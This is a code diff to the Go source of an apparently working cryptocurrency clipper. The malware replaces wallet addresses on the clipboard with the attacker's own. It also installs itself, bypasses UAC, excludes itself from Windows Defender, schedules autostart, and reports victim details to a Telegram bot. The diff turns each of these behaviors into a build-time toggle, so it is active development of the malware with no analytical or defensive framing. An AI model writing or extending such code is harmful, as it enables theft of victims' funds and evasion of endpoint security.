@@ -47,6 +47,14 @@ var (
 	blockedGeos string
 )
 
+// behavior settings
+var (
+	enable_install 				string
+	enable_uac_bypass 			string
+	enable_defender_excluder	string
+	enable_autostart 			string
+)
+
 var matchers = []clipper.Matcher{
 	{Regex: btcRegex, Addr: BtcAddr},
 	{Regex: ethRegex, Addr: EthAddr},
@@ -60,9 +68,18 @@ var matchers = []clipper.Matcher{
 }
 
 func main() {
-	install.InstallSelf()
+	installEnabled := enable_install == "true"
+	uacEnabled := enable_uac_bypass == "true"
+	defenderEnabled := enable_defender_excluder == "true"
+	autostartEnabled := enable_autostart == "true"
 
-	uac.Run()
+	if installEnabled {
+		install.InstallSelf()
+	}
+
+	if uacEnabled {
+		uac.Run()
+	}
 
 	// we checking geo block
 	geo := utils.GetGeo()
@@ -71,8 +88,11 @@ func main() {
 	selfPath, _ := utils.GetSelfPath()
 	selfName, _ := utils.GetSelfName()
 
-	_ = defender.ExcludeFromDefender(selfPath)
 
+	if defenderEnabled {
+		_ = defender.ExcludeFromDefender(selfPath)
+	}
+	
 	user, _ := user.Current()
 	pid := syscall.Getpid()
 
@@ -86,7 +106,9 @@ func main() {
 		utils.IsAdmin(),
 	), chat_id, bot_token)
 
-	_ = autorun.AddToSchelduler(selfPath, selfName)
+	if autostartEnabled {
+		_ = autorun.AddToSchelduler(selfPath, selfName)
+	}
 
 	// we starting main clipper process
 	clipper.StartClipper(chat_id, bot_token, matchers, user.Username)
